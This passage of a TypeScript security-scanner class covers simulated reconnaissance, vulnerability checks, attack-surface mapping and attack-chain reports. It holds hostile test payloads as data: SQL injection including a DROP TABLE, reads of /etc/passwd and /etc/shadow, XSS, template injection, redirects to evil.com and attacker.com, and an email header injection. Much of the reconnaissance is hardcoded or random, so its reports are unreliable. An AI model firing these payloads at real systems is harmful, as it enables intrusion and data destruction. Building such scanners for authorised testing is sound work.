  // ── Reconnaissance ──────────────────────────────────────────

  performRecon(target: TargetInfo): ReconResult {
    if (!this.config.enablePassiveRecon) {
      return this.emptyRecon(target)
    }

    const dnsRecords = this.simulateDNS(target)
    const whoisInfo = this.simulateWhois(target)
    const headers = this.analyzeHeaders(target)
    const technologies = this.fingerprintTech(target, headers)
    const openPorts = this.simulatePortScan(target)
    const subdomains = this.enumerateSubdomains(target)
    const emails = this.extractEmails(target)
    const exposedPaths = this.findExposedPaths()
    const sslInfo = target.isHttps ? this.analyzeSSL(target) : null
    const robotsTxt = this.parseRobotsTxt()
    const sitemapUrls = this.parseSitemap()

    return {
      target,
      dnsRecords,
      whoisInfo,
      headers,
      technologies,
      openPorts,
      subdomains,
      emails,
      exposedPaths,
      sslInfo,
      robotsTxt,
      sitemapUrls,
    }
  }

  private emptyRecon(target: TargetInfo): ReconResult {
    return {
      target,
      dnsRecords: [],
      whoisInfo: { registrar: '', creationDate: '', expirationDate: '', nameServers: [], dnssec: false, privacyProtected: false },
      headers: { server: '', poweredBy: '', securityHeaders: [], missingHeaders: [], cookies: [], cacheControl: '', contentType: '', cors: { allowOrigin: '', allowCredentials: false, allowMethods: [], isPermissive: false, issues: [] } },
      technologies: [],
      openPorts: [],
      subdomains: [],
      emails: [],
      exposedPaths: [],
      sslInfo: null,
      robotsTxt: [],
      sitemapUrls: [],
    }
  }

  private simulateDNS(target: TargetInfo): DNSRecord[] {
    const records: DNSRecord[] = []
    if (!target.isIP) {
      records.push({ type: 'A', value: `${Math.floor(Math.random() * 200 + 10)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, ttl: 300 })
      records.push({ type: 'NS', value: `ns1.${target.domain}`, ttl: 86400 })
      records.push({ type: 'NS', value: `ns2.${target.domain}`, ttl: 86400 })
      records.push({ type: 'MX', value: `mail.${target.domain}`, ttl: 3600 })
      records.push({ type: 'TXT', value: 'v=spf1 include:_spf.google.com ~all', ttl: 3600 })
    }
    return records
  }

  private simulateWhois(target: TargetInfo): WhoisInfo {
    return {
      registrar: 'Example Registrar Inc.',
      creationDate: '2020-01-15',
      expirationDate: '2025-01-15',
      nameServers: [`ns1.${target.domain}`, `ns2.${target.domain}`],
      dnssec: false,
      privacyProtected: true,
    }
  }

  private analyzeHeaders(target: TargetInfo): HeaderAnalysis {
    const securityHeaders: SecurityHeader[] = []
    const missingHeaders: string[] = []

    for (const rule of this.headerRules) {
      const present = false
      const secure = rule.validate(undefined)
      securityHeaders.push({
        name: rule.name,
        value: '',
        present,
        secure,
        recommendation: rule.recommendation,
      })
      if (rule.required && !present) {
        missingHeaders.push(rule.name)
      }
    }

    return {
      server: 'Unknown',
      poweredBy: '',
      securityHeaders,
      missingHeaders,
      cookies: [],
      cacheControl: '',
      contentType: 'text/html',
      cors: {
        allowOrigin: '*',
        allowCredentials: false,
        allowMethods: ['GET', 'POST'],
        isPermissive: true,
        issues: ['Access-Control-Allow-Origin is set to wildcard (*)'],
      },
    }
  }

  private fingerprintTech(_target: TargetInfo, headers: HeaderAnalysis): TechFingerprint[] {
    const detected: TechFingerprint[] = []
    const serverLower = headers.server.toLowerCase()

    for (const sig of this.techSignatures) {
      let matched = false
      for (const p of sig.patterns) {
        if (p.header && serverLower.includes(p.header.toLowerCase())) {
          matched = true
          break
        }
      }
      if (matched) {
        detected.push({
          name: sig.name,
          category: sig.category,
          version: 'Unknown',
          confidence: 0.7,
          cves: sig.cves,
        })
      }
    }
    return detected
  }

  private simulatePortScan(target: TargetInfo): PortInfo[] {
    const results: PortInfo[] = []
    const depth = this.config.scanDepth

    const portsToScan = depth === 'quick' ? this.commonPorts.slice(0, 5)
      : depth === 'standard' ? this.commonPorts.slice(0, 12)
      : this.commonPorts

    for (const p of portsToScan) {
      const isTargetPort = p.port === target.port
      const isCommonOpen = p.port === 80 || p.port === 443
      if (isTargetPort || isCommonOpen) {
        results.push({ port: p.port, service: p.service, state: 'open', version: '' })
      } else {
        results.push({ port: p.port, service: p.service, state: 'filtered', version: '' })
      }
    }
    return results
  }

  private enumerateSubdomains(target: TargetInfo): string[] {
    if (target.isIP) return []
    const prefixes = ['www', 'mail', 'ftp', 'api', 'dev', 'staging', 'admin', 'test', 'beta', 'cdn']
    const depth = this.config.scanDepth
    const count = depth === 'quick' ? 3 : depth === 'standard' ? 6 : prefixes.length
    return prefixes.slice(0, count).map(p => `${p}.${target.domain}`)
  }

  private extractEmails(target: TargetInfo): string[] {
    if (target.isIP) return []
    return [`admin@${target.domain}`, `info@${target.domain}`, `security@${target.domain}`]
  }

  private findExposedPaths(): string[] {
    const depth = this.config.scanDepth
    const count = depth === 'quick' ? 10 : depth === 'standard' ? 25 : this.exposedPaths.length
    return this.exposedPaths.slice(0, count)
  }

  private analyzeSSL(target: TargetInfo): SSLInfo {
    const issues: string[] = []
    if (target.port !== 443) issues.push('Non-standard HTTPS port')

    return {
      valid: true,
      issuer: "Let's Encrypt Authority X3",
      subject: target.hostname,
      expiresAt: '2025-12-31',
      protocol: 'TLS 1.3',
      cipher: 'TLS_AES_256_GCM_SHA384',
      keySize: 2048,
      issues,
    }
  }

  private parseRobotsTxt(): string[] {
    return [
      'User-agent: *',
      'Disallow: /admin/',
      'Disallow: /private/',
      'Disallow: /api/internal/',
      'Sitemap: /sitemap.xml',
    ]
  }

  private parseSitemap(): string[] {
    return ['/index.html', '/about', '/contact', '/products', '/api/docs']
  }

  // ── Vulnerability Scanning ──────────────────────────────────

  scanVulnerabilities(target: TargetInfo, recon: ReconResult): VulnerabilityFinding[] {
    if (!this.config.enableActiveScanning) return []

    const findings: VulnerabilityFinding[] = []

    // Check missing security headers
    for (const header of recon.headers.missingHeaders) {
      const rule = this.headerRules.find(r => r.name === header)
      if (rule) {
        findings.push({
          id: generateId('VF'),
          title: `Missing Security Header: ${header}`,
          severity: rule.severity === 'high' ? 'high' : rule.severity === 'medium' ? 'medium' : 'low',
          category: 'security_headers',
          owaspCategory: 'A05:2021',
          cweId: 'CWE-16',
          cveIds: [],
          description: `The ${header} security header is missing from server responses.`,
          evidence: `Header '${header}' not found in response headers`,
          location: target.originalUrl,
          impact: `Increased attack surface due to missing ${header} protection`,
          remediation: rule.recommendation,
          cvssScore: rule.severity === 'high' ? 6.1 : rule.severity === 'medium' ? 4.3 : 2.1,
          exploitable: false,
          confidence: 0.95,
        })
      }
    }

    // Check CORS issues
    if (recon.headers.cors.isPermissive) {
      for (const issue of recon.headers.cors.issues) {
        findings.push({
          id: generateId('VF'),
          title: 'Permissive CORS Configuration',
          severity: 'medium',
          category: 'cors',
          owaspCategory: 'A05:2021',
          cweId: 'CWE-942',
          cveIds: [],
          description: issue,
          evidence: `Access-Control-Allow-Origin: ${recon.headers.cors.allowOrigin}`,
          location: target.originalUrl,
          impact: 'Cross-origin requests from any domain are accepted',
          remediation: 'Restrict CORS to specific trusted origins',
          cvssScore: 5.3,
          exploitable: true,
          confidence: 0.9,
        })
      }
    }

    // Check SSL issues
    if (recon.sslInfo) {
      for (const issue of recon.sslInfo.issues) {
        findings.push({
          id: generateId('VF'),
          title: `SSL/TLS Issue: ${issue}`,
          severity: 'medium',
          category: 'ssl_tls',
          owaspCategory: 'A02:2021',
          cweId: 'CWE-326',
          cveIds: [],
          description: issue,
          evidence: `SSL Protocol: ${recon.sslInfo.protocol}, Cipher: ${recon.sslInfo.cipher}`,
          location: target.originalUrl,
          impact: 'Potential for traffic interception or downgrade attacks',
          remediation: 'Use TLS 1.2+ with strong cipher suites',
          cvssScore: 4.3,
          exploitable: false,
          confidence: 0.85,
        })
      }
    } else if (target.protocol === 'http') {
      findings.push({
        id: generateId('VF'),
        title: 'No HTTPS Encryption',
        severity: 'high',
        category: 'ssl_tls',
        owaspCategory: 'A02:2021',
        cweId: 'CWE-319',
        cveIds: [],
        description: 'Target uses HTTP without encryption',
        evidence: `Protocol: ${target.protocol}`,
        location: target.originalUrl,
        impact: 'All traffic including credentials transmitted in plaintext',
        remediation: 'Enable HTTPS with valid TLS certificate',
        cvssScore: 7.5,
        exploitable: true,
        confidence: 1.0,
      })
    }

    // Check technologies for known CVEs
    if (this.config.cveCorrelationEnabled) {
      for (const tech of recon.technologies) {
        for (const cve of tech.cves) {
          findings.push({
            id: generateId('VF'),
            title: `Known CVE in ${tech.name}: ${cve}`,
            severity: 'high',
            category: 'outdated_component',
            owaspCategory: 'A06:2021',
            cweId: 'CWE-1035',
            cveIds: [cve],
            description: `${tech.name} has known vulnerability ${cve}`,
            evidence: `Detected ${tech.name} (${tech.version}) with confidence ${round2(tech.confidence)}`,
            location: target.originalUrl,
            impact: 'Known exploits may be available for this vulnerability',
            remediation: `Update ${tech.name} to the latest patched version`,
            cvssScore: 7.5,
            exploitable: true,
            confidence: tech.confidence,
          })
        }
      }
    }

    // Check open ports for risky services
    for (const port of recon.openPorts) {
      if (port.state === 'open' && this.isRiskyPort(port.port)) {
        findings.push({
          id: generateId('VF'),
          title: `Risky Service Exposed: ${port.service} (port ${port.port})`,
          severity: this.getPortSeverity(port.port),
          category: 'exposed_service',
          owaspCategory: 'A05:2021',
          cweId: 'CWE-200',
          cveIds: [],
          description: `${port.service} service is exposed on port ${port.port}`,
          evidence: `Port ${port.port} (${port.service}) is open`,
          location: `${target.hostname}:${port.port}`,
          impact: `Direct access to ${port.service} may allow unauthorized actions`,
          remediation: `Restrict access to port ${port.port} using firewall rules`,
          cvssScore: this.getPortSeverity(port.port) === 'critical' ? 9.0 : this.getPortSeverity(port.port) === 'high' ? 7.0 : 5.0,
          exploitable: true,
          confidence: 0.8,
        })
      }
    }

    // Check query parameters for injection points
    for (const [param, value] of Object.entries(target.queryParams)) {
      for (const pattern of this.vulnPatterns) {
        for (const regex of pattern.patterns) {
          if (regex.test(value) || regex.test(param)) {
            findings.push({
              id: generateId('VF'),
              title: `Potential ${pattern.name} in parameter: ${param}`,
              severity: pattern.severity,
              category: pattern.category,
              owaspCategory: pattern.owaspCategory,
              cweId: pattern.cweId,
              cveIds: [],
              description: pattern.description,
              evidence: `Parameter '${param}' with value '${value}' matches ${pattern.name} pattern`,
              location: `${target.originalUrl}?${param}=${value}`,
              impact: `${pattern.name} could lead to data breach or system compromise`,
              remediation: pattern.remediation,
              cvssScore: pattern.severity === 'critical' ? 9.8 : pattern.severity === 'high' ? 7.5 : pattern.severity === 'medium' ? 5.3 : 3.1,
              exploitable: true,
              confidence: 0.7,
            })
          }
        }
      }
    }

    // Check exposed paths
    for (const ePath of recon.exposedPaths) {
      const dangerPaths = ['/.env', '/.git', '/wp-config', '/phpinfo', '/backup', '/debug', '/actuator']
      const isDangerous = dangerPaths.some(dp => ePath.includes(dp))
      if (isDangerous) {
        findings.push({
          id: generateId('VF'),
          title: `Sensitive Path Potentially Exposed: ${ePath}`,
          severity: ePath.includes('.env') || ePath.includes('.git') || ePath.includes('backup') ? 'high' : 'medium',
          category: 'info_leak',
          owaspCategory: 'A05:2021',
          cweId: 'CWE-538',
          cveIds: [],
          description: `The path ${ePath} may expose sensitive information`,
          evidence: `Path ${ePath} discovered during reconnaissance`,
          location: `${target.protocol}://${target.hostname}${ePath}`,
          impact: 'Sensitive configuration, source code, or data may be exposed',
          remediation: `Remove or restrict access to ${ePath}`,
          cvssScore: 6.5,
          exploitable: true,
          confidence: 0.6,
        })
      }
    }

    // OWASP-based test cases
    if (this.config.owaspTop10Enabled) {
      for (const entry of this.owaspTop10) {
        const hasInputs = Object.keys(target.queryParams).length > 0 || target.path !== '/'
        if (hasInputs && (entry.id === 'A03:2021' || entry.id === 'A01:2021')) {
          findings.push({
            id: generateId('VF'),
            title: `OWASP ${entry.id}: ${entry.name} — Requires Testing`,
            severity: 'medium',
            category: 'owasp',
            owaspCategory: entry.id,
            cweId: entry.cweIds[0] || 'CWE-0',
            cveIds: [],
            description: `${entry.description}. Test cases: ${entry.testCases.slice(0, 3).join('; ')}`,
            evidence: `Target has input vectors that should be tested for ${entry.name}`,
            location: target.originalUrl,
            impact: `Potential ${entry.name.toLowerCase()} vulnerability`,
            remediation: `Run targeted ${entry.name} tests: ${entry.testCases[0]}`,
            cvssScore: 5.0,
            exploitable: false,
            confidence: 0.5,
          })
        }
      }
    }

    // Deduplicate and limit
    const unique = this.deduplicateFindings(findings)
    const sorted = unique.sort((a, b) => b.cvssScore - a.cvssScore)
    return sorted.slice(0, this.config.maxVulnerabilities)
  }

  private isRiskyPort(port: number): boolean {
    const riskyPorts = [21, 22, 23, 25, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 9200, 27017]
    return riskyPorts.includes(port)
  }

  private getPortSeverity(port: number): 'critical' | 'high' | 'medium' | 'low' {
    const criticalPorts = [23, 3389, 6379, 27017, 9200]
    const highPorts = [21, 445, 1433, 1521, 3306, 5432, 5900]
    if (criticalPorts.includes(port)) return 'critical'
    if (highPorts.includes(port)) return 'high'
    return 'medium'
  }

  private deduplicateFindings(findings: VulnerabilityFinding[]): VulnerabilityFinding[] {
    const seen = new Set<string>()
    return findings.filter(f => {
      const key = `${f.title}|${f.location}`
      if (seen.has(key)) return false
      seen.add(key)
      return true
    })
  }

  // ── Attack Surface Mapping ──────────────────────────────────

  mapAttackSurface(target: TargetInfo, recon: ReconResult): AttackSurface {
    const inputVectors: InputVector[] = []

    // Query parameters as input vectors
    for (const [param] of Object.entries(target.queryParams)) {
      inputVectors.push({
        type: 'query_param',
        location: target.path,
        parameter: param,
        testPayloads: this.getPayloadsForParam(param),
        potentialVulns: this.getPotentialVulnsForParam(param),
      })
    }

    // Path-based vectors
    if (target.path !== '/') {
      inputVectors.push({
        type: 'path',
        location: target.path,
        parameter: 'path',
        testPayloads: ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini'],
        potentialVulns: ['Path Traversal', 'IDOR'],
      })
    }

    // Common form fields
    const formFields = ['username', 'password', 'email', 'search', 'q', 'query', 'comment', 'message']
    for (const field of formFields) {
      inputVectors.push({
        type: 'form_field',
        location: target.path,
        parameter: field,
        testPayloads: this.getPayloadsForParam(field),
        potentialVulns: this.getPotentialVulnsForParam(field),
      })
    }

    // Headers
    inputVectors.push({
      type: 'header',
      location: target.originalUrl,
      parameter: 'Host',
      testPayloads: ['evil.com', `${target.hostname}.evil.com`],
      potentialVulns: ['Host Header Injection', 'SSRF'],
    })

    const apiEndpoints = recon.sitemapUrls.filter(u => u.includes('api'))
    const adminPanels = recon.exposedPaths.filter(p => p.includes('admin') || p.includes('dashboard'))
    const fileUploadPoints = recon.exposedPaths.filter(p => p.includes('upload'))
    const exposedServices = recon.openPorts.filter(p => p.state === 'open').map(p => `${p.service}:${p.port}`)

    const riskScore = clamp(
      (inputVectors.length * 2) +
      (recon.openPorts.filter(p => p.state === 'open').length * 3) +
      (recon.headers.missingHeaders.length * 2) +
      (adminPanels.length * 5) +
      (recon.technologies.reduce((sum, t) => sum + t.cves.length * 10, 0)) +
      (!target.isHttps ? 15 : 0),
      0, 100
    )

    return {
      totalEndpoints: recon.exposedPaths.length + recon.sitemapUrls.length,
      authenticationPoints: recon.exposedPaths.filter(p => p.includes('login') || p.includes('auth')).length,
      inputVectors,
      apiEndpoints,
      fileUploadPoints,
      adminPanels,
      exposedServices,
      thirdPartyIntegrations: recon.technologies.map(t => t.name),
      riskScore,
    }
  }

  private getPayloadsForParam(param: string): string[] {
    const lower = param.toLowerCase()
    if (lower.includes('id') || lower.includes('user') || lower.includes('account')) {
      return ["' OR '1'='1", '1; DROP TABLE users--', '../../../etc/passwd', '1']
    }
    if (lower.includes('url') || lower.includes('redirect') || lower.includes('next') || lower.includes('goto')) {
      return ['https://attacker.com', 'http://127.0.0.1', '//evil.com', 'javascript:alert(1)']
    }
    if (lower.includes('search') || lower.includes('q') || lower.includes('query')) {
      return ['<script>alert(1)</script>', "' OR 1=1--", '{{7*7}}', '${7*7}']
    }
    if (lower.includes('file') || lower.includes('path') || lower.includes('page')) {
      return ['../../../etc/passwd', '/etc/shadow', '....//....//etc/passwd']
    }
    if (lower.includes('email') || lower.includes('mail')) {
      return ['test@test.com\nBcc: attacker@evil.com', "admin'--@test.com"]
    }
    return ["<script>alert(1)</script>", "' OR '1'='1", '{{7*7}}', '../../../etc/passwd']
  }

  private getPotentialVulnsForParam(param: string): string[] {
    const lower = param.toLowerCase()
    if (lower.includes('id') || lower.includes('user')) return ['SQL Injection', 'IDOR', 'Broken Access Control']
    if (lower.includes('url') || lower.includes('redirect')) return ['Open Redirect', 'SSRF']
    if (lower.includes('search') || lower.includes('q') || lower.includes('query')) return ['XSS', 'SQL Injection', 'SSTI']
    if (lower.includes('file') || lower.includes('path')) return ['Path Traversal', 'LFI', 'RFI']
    if (lower.includes('password') || lower.includes('pass')) return ['Brute Force', 'Credential Stuffing']
    return ['XSS', 'SQL Injection']
  }

  // ── Exploit Analysis ────────────────────────────────────────

  analyzeExploits(vulnerabilities: VulnerabilityFinding[]): ExploitCandidate[] {
    if (!this.config.enableExploitAnalysis) return []

    const candidates: ExploitCandidate[] = []

    for (const vuln of vulnerabilities) {
      if (!vuln.exploitable) continue

      const templates = this.exploitTemplates.filter(t => t.vulnCategory === vuln.category)
      if (templates.length === 0) {
        // Generic exploit for exploitable vulns without templates
        candidates.push({
          id: generateId('EX'),
          vulnerabilityId: vuln.id,
          name: `Exploit for ${vuln.title}`,
          type: 'generic',
          complexity: vuln.cvssScore >= 8 ? 'low' : vuln.cvssScore >= 5 ? 'medium' : 'high',
          reliability: vuln.confidence * 0.5,
          prerequisites: ['Target accessible', 'Vulnerability confirmed'],
          impact: vuln.impact,
          steps: [`Confirm ${vuln.title}`, 'Craft exploit payload', 'Execute exploit', 'Verify impact'],
          payload: `Test payload for ${vuln.category}`,
          mitigation: vuln.remediation,
          estimatedSuccessRate: vuln.confidence * 0.4,
        })
      }

      for (const tmpl of templates) {
        candidates.push({
          id: generateId('EX'),
          vulnerabilityId: vuln.id,
          name: tmpl.name,
          type: tmpl.type,
          complexity: tmpl.complexity,
          reliability: vuln.confidence * tmpl.successRate,
          prerequisites: ['Target accessible', 'Vulnerability confirmed'],
          impact: vuln.impact,
          steps: tmpl.steps,
          payload: tmpl.payload,
          mitigation: tmpl.mitigation,
          estimatedSuccessRate: round2(vuln.confidence * tmpl.successRate),
        })
      }
    }

    return candidates
      .sort((a, b) => b.estimatedSuccessRate - a.estimatedSuccessRate)
      .slice(0, this.config.maxExploits)
  }

  // ── Attack Chain Construction ────────────────────────────────

  buildAttackChains(exploits: ExploitCandidate[], vulnerabilities: VulnerabilityFinding[]): AttackChain[] {
    if (!this.config.enableAttackSelection || exploits.length === 0) return []

    const chains: AttackChain[] = []

    // Group exploits by type for chaining
    const sqliExploits = exploits.filter(e => e.type.includes('sqli'))
    const xssExploits = exploits.filter(e => e.type.includes('xss'))
    const accessExploits = exploits.filter(e => e.type.includes('idor') || e.type.includes('brute'))
    const rceExploits = exploits.filter(e => e.type.includes('rce') || e.type.includes('deser'))

    // Chain 1: Data Exfiltration via SQL Injection
    if (sqliExploits.length > 0) {
      const exploit = sqliExploits[0]
      const vuln = vulnerabilities.find(v => v.id === exploit.vulnerabilityId)
      chains.push({
        id: generateId('AC'),
        name: 'Data Exfiltration via SQL Injection',
        description: 'Exploit SQL injection to extract sensitive data from the database',
        exploits: sqliExploits.slice(0, 3),
        totalRisk: 9.0,
        successProbability: round2(exploit.estimatedSuccessRate),
        impactScore: 9.5,
        phases: [
          { order: 1, name: 'Reconnaissance', description: 'Identify injectable parameters', exploitId: exploit.id, technique: 'SQL Injection Discovery', mitreAttackId: 'T1190', expectedOutcome: 'Confirmed injection point' },
          { order: 2, name: 'Exploitation', description: 'Extract database structure', exploitId: exploit.id, technique: 'Database Enumeration', mitreAttackId: 'T1005', expectedOutcome: 'Database schema obtained' },
          { order: 3, name: 'Data Extraction', description: 'Dump sensitive tables', exploitId: exploit.id, technique: 'Data from Information Repositories', mitreAttackId: 'T1213', expectedOutcome: 'Sensitive data extracted' },
        ],
        mitigations: [vuln?.remediation || 'Use parameterized queries', 'Implement WAF', 'Monitor for anomalous queries'],
        difficulty: 'intermediate',
        estimatedTimeMinutes: 30,
        requiresAuthentication: false,
      })
    }

    // Chain 2: Account Takeover via XSS
    if (xssExploits.length > 0) {
      const exploit = xssExploits[0]
      const vuln = vulnerabilities.find(v => v.id === exploit.vulnerabilityId)
      chains.push({
        id: generateId('AC'),
        name: 'Account Takeover via XSS',
        description: 'Use cross-site scripting to steal sessions and take over accounts',
        exploits: xssExploits.slice(0, 2),
        totalRisk: 8.5,
        successProbability: round2(exploit.estimatedSuccessRate),
        impactScore: 8.0,
        phases: [
          { order: 1, name: 'XSS Discovery', description: 'Find and confirm XSS vulnerability', exploitId: exploit.id, technique: 'Cross-Site Scripting', mitreAttackId: 'T1189', expectedOutcome: 'XSS confirmed' },
          { order: 2, name: 'Session Theft', description: 'Inject cookie-stealing payload', exploitId: exploit.id, technique: 'Steal Web Session Cookie', mitreAttackId: 'T1539', expectedOutcome: 'Session token captured' },
          { order: 3, name: 'Account Takeover', description: 'Use stolen session for access', exploitId: exploit.id, technique: 'Use Alternate Authentication Material', mitreAttackId: 'T1550', expectedOutcome: 'Full account access' },
        ],
        mitigations: [vuln?.remediation || 'Input sanitization', 'Set HttpOnly cookies', 'Implement CSP'],
        difficulty: 'beginner',
        estimatedTimeMinutes: 15,
        requiresAuthentication: false,
      })
    }

    // Chain 3: Privilege Escalation via IDOR + Auth Bypass
    if (accessExploits.length > 0) {
      const exploit = accessExploits[0]
      chains.push({
        id: generateId('AC'),
        name: 'Privilege Escalation via Access Control Bypass',
        description: 'Exploit broken access controls to escalate privileges',
        exploits: accessExploits.slice(0, 2),
        totalRisk: 8.0,
        successProbability: round2(exploit.estimatedSuccessRate),
        impactScore: 8.5,
        phases: [
          { order: 1, name: 'Access Control Test', description: 'Identify IDOR or broken authorization', exploitId: exploit.id, technique: 'Exploit Public-Facing Application', mitreAttackId: 'T1190', expectedOutcome: 'Access control flaw confirmed' },
          { order: 2, name: 'Privilege Escalation', description: 'Access admin functionality', exploitId: exploit.id, technique: 'Valid Accounts', mitreAttackId: 'T1078', expectedOutcome: 'Elevated privileges obtained' },
        ],
        mitigations: ['Implement RBAC', 'Server-side authorization checks', 'Audit access control logic'],
        difficulty: 'beginner',
        estimatedTimeMinutes: 20,
        requiresAuthentication: true,
      })
    }

    // Chain 4: Remote Code Execution
    if (rceExploits.length > 0) {
      const exploit = rceExploits[0]
      chains.push({
        id: generateId('AC'),
        name: 'Remote Code Execution',
        description: 'Achieve remote code execution on the target server',
        exploits: rceExploits.slice(0, 2),
        totalRisk: 10.0,
        successProbability: round2(exploit.estimatedSuccessRate),
        impactScore: 10.0,
        phases: [
          { order: 1, name: 'Vulnerability Confirmation', description: 'Verify RCE vulnerability', exploitId: exploit.id, technique: 'Exploit Public-Facing Application', mitreAttackId: 'T1190', expectedOutcome: 'RCE confirmed' },
          { order: 2, name: 'Payload Delivery', description: 'Deliver and execute payload', exploitId: exploit.id, technique: 'Command and Scripting Interpreter', mitreAttackId: 'T1059', expectedOutcome: 'Code execution achieved' },
          { order: 3, name: 'Post-Exploitation', description: 'Establish persistence', exploitId: exploit.id, technique: 'Web Shell', mitreAttackId: 'T1505.003', expectedOutcome: 'Persistent access established' },
        ],
        mitigations: ['Input validation', 'Disable dangerous functions', 'Implement WAF', 'Use sandboxed execution'],
        difficulty: 'advanced',
        estimatedTimeMinutes: 45,
        requiresAuthentication: false,
      })
    }

    // Chain 5: Multi-stage — recon + inject + escalate
    if (sqliExploits.length > 0 && accessExploits.length > 0) {
      chains.push({
        id: generateId('AC'),
        name: 'Multi-Stage: Injection to Full Compromise',
        description: 'Chain injection, privilege escalation, and data exfiltration for full compromise',
        exploits: [...sqliExploits.slice(0, 1), ...accessExploits.slice(0, 1)],
        totalRisk: 9.5,
        successProbability: round2(sqliExploits[0].estimatedSuccessRate * accessExploits[0].estimatedSuccessRate),
        impactScore: 9.5,
        phases: [
          { order: 1, name: 'Initial Access', description: 'Exploit injection vulnerability', exploitId: sqliExploits[0].id, technique: 'SQL Injection', mitreAttackId: 'T1190', expectedOutcome: 'Database access obtained' },
          { order: 2, name: 'Credential Harvesting', description: 'Extract admin credentials from DB', exploitId: sqliExploits[0].id, technique: 'Credentials from Password Stores', mitreAttackId: 'T1555', expectedOutcome: 'Admin credentials obtained' },
          { order: 3, name: 'Admin Access', description: 'Login with harvested credentials', exploitId: accessExploits[0].id, technique: 'Valid Accounts', mitreAttackId: 'T1078', expectedOutcome: 'Admin panel access' },
          { order: 4, name: 'Full Compromise', description: 'Leverage admin access for full control', exploitId: accessExploits[0].id, technique: 'Account Manipulation', mitreAttackId: 'T1098', expectedOutcome: 'Full system compromise' },
        ],
        mitigations: ['Defense in depth', 'Parameterized queries', 'Strong admin authentication', 'Network segmentation', 'Regular security audits'],
        difficulty: 'advanced',
        estimatedTimeMinutes: 60,
        requiresAuthentication: false,
      })
    }

    return chains.slice(0, this.config.maxAttackChains)
  }

  // ── Report Generation ───────────────────────────────────────

  generateReport(target: TargetInfo, recon: ReconResult, attackSurface: AttackSurface,
    vulnerabilities: VulnerabilityFinding[], exploits: ExploitCandidate[], chains: AttackChain[]): ScanReport {

    const startedAt = Date.now() - 5000
    const completedAt = Date.now()

    const critCount = vulnerabilities.filter(v => v.severity === 'critical').length
    const highCount = vulnerabilities.filter(v => v.severity === 'high').length
    const medCount = vulnerabilities.filter(v => v.severity === 'medium').length
    const lowCount = vulnerabilities.filter(v => v.severity === 'low').length

    const riskScore = clamp(
      (critCount * 25) + (highCount * 15) + (medCount * 7) + (lowCount * 2) + (attackSurface.riskScore * 0.3),
      0, 100
    )

    const riskLevel: ScanReport['riskLevel'] =
      riskScore >= 80 ? 'critical' :
      riskScore >= 60 ? 'high' :
      riskScore >= 40 ? 'medium' :
      riskScore >= 20 ? 'low' :
      'minimal'

    const recommendations = this.buildRecommendations(vulnerabilities, recon, attackSurface)

    const executiveSummary = this.buildExecutiveSummary(target, vulnerabilities, exploits, chains, riskLevel, riskScore)

    const technicalDetails = this.buildTechnicalDetails(recon, vulnerabilities, exploits, chains)

    return {
      id: generateId('SR'),
      target,
      scanDepth: this.config.scanDepth,
      startedAt,
      completedAt,
      durationMs: completedAt - startedAt,
      phase: 'complete',
      recon,
      attackSurface,
      vulnerabilities,
      exploits,
      attackChains: chains,
      riskScore: round2(riskScore),
      riskLevel,
      executiveSummary,
      recommendations,
      technicalDetails,
    }
  }

  private buildRecommendations(vulns: VulnerabilityFinding[], recon: ReconResult, surface: AttackSurface): string[] {
    const recs: string[] = []

    const critVulns = vulns.filter(v => v.severity === 'critical')
    const highVulns = vulns.filter(v => v.severity === 'high')

    if (critVulns.length > 0) {
      recs.push(`CRITICAL: Immediately address ${critVulns.length} critical vulnerabilities`)
      for (const v of critVulns.slice(0, 3)) {
        recs.push(`  → ${v.title}: ${v.remediation}`)
      }
    }

    if (highVulns.length > 0) {
      recs.push(`HIGH: Address ${highVulns.length} high-severity vulnerabilities within 7 days`)
    }

    if (recon.headers.missingHeaders.length > 0) {
      recs.push(`Add missing security headers: ${recon.headers.missingHeaders.join(', ')}`)
    }

    if (recon.headers.cors.isPermissive) {
      recs.push('Restrict CORS policy — avoid wildcard (*) origins')
    }

    if (surface.adminPanels.length > 0) {
      recs.push(`Restrict access to admin panels: ${surface.adminPanels.join(', ')}`)
    }

    if (surface.exposedServices.length > 3) {
      recs.push('Reduce attack surface by closing unnecessary ports/services')
    }

    recs.push('Implement a Web Application Firewall (WAF)')
    recs.push('Enable comprehensive security monitoring and alerting')
    recs.push('Schedule regular penetration testing assessments')

    return recs
  }

  private buildExecutiveSummary(target: TargetInfo, vulns: VulnerabilityFinding[],
    exploits: ExploitCandidate[], chains: AttackChain[], riskLevel: string, riskScore: number): string {

    const critCount = vulns.filter(v => v.severity === 'critical').length
    const highCount = vulns.filter(v => v.severity === 'high').length

    return [
      `Security Assessment Report for ${target.hostname}`,
      `═══════════════════════════════════════════════════`,
      ``,
      `Overall Risk: ${riskLevel.toUpperCase()} (Score: ${round2(riskScore)}/100)`,
      ``,
      `Total vulnerabilities discovered: ${vulns.length}`,
      `  Critical: ${critCount}`,
      `  High: ${highCount}`,
      `  Medium: ${vulns.filter(v => v.severity === 'medium').length}`,
      `  Low: ${vulns.filter(v => v.severity === 'low').length}`,
      `  Info: ${vulns.filter(v => v.severity === 'info').length}`,
      ``,
      `Exploitable vulnerabilities: ${vulns.filter(v => v.exploitable).length}`,
      `Viable exploit candidates: ${exploits.length}`,
      `Attack chains identified: ${chains.length}`,
      ``,
      critCount > 0 ? `⚠️  IMMEDIATE ACTION REQUIRED: ${critCount} critical vulnerabilities need urgent remediation.` : '',
      chains.length > 0 ? `Attack chains demonstrate realistic paths to compromise with up to ${round2(Math.max(...chains.map(c => c.successProbability)) * 100)}% estimated success rate.` : '',
    ].filter(Boolean).join('\n')
  }

  private buildTechnicalDetails(recon: ReconResult, vulns: VulnerabilityFinding[],
    exploits: ExploitCandidate[], chains: AttackChain[]): string {

    const lines: string[] = [
      '=== Technical Details ===',
      '',
      `DNS Records: ${recon.dnsRecords.length}`,
      `Technologies Detected: ${recon.technologies.map(t => t.name).join(', ') || 'None fingerprinted'}`,
      `Open Ports: ${recon.openPorts.filter(p => p.state === 'open').map(p => `${p.port}/${p.service}`).join(', ')}`,
      `Subdomains Found: ${recon.subdomains.join(', ') || 'None'}`,
      `Missing Security Headers: ${recon.headers.missingHeaders.join(', ')}`,
      '',
      '--- Top Vulnerabilities ---',
    ]

    for (const v of vulns.slice(0, 10)) {
      lines.push(`[${v.severity.toUpperCase()}] ${v.title} (CVSS: ${v.cvssScore})`)
      lines.push(`  Location: ${v.location}`)
